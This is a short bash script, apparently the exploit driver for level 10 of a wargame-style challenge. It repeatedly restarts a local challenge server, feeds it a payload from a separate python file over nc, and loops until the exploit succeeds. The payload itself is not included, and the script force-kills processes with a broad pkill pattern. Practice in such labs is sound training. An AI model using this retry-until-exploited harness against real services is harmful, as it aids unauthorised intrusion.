#! /usr/bin/env bash

# N.B. if possible, run with `env -i ./exploit`

output=output_temp
echo "" > $output
echo
echo "Starting attempts..."

# silently stop all servers
pkill -9 -f 10 &> /dev/null
msg=""

# retry until exploit is successful
until grep -q -i 'lev10' $output
do
    rm $output 2> /dev/null

    echo "" > $output
    echo 1>&2
    echo "Starting Server:"

    # start server, then move to background
    env -i /var/challenge/level10/10 -p 2222 &> $output &
    server_pid=$!

    echo " - Server PID: $server_pid"
    until grep -q -i 'Starting server on port' $output
    do
        sleep 0.1
    done
    rm $output 2> /dev/null

    echo
    echo "Sending payload to server:"
    echo "" > $output

    # execute payload
    timeout 6 python server_interaction.py | nc localhost 2222 | tee $output
    kill -9 $server_pid > /dev/null
    echo
    echo "============================== $msg"
    msg="Retrying..."
done 2> /dev/null
echo
echo "Successfully executed l33t!"
echo "Done."
echo
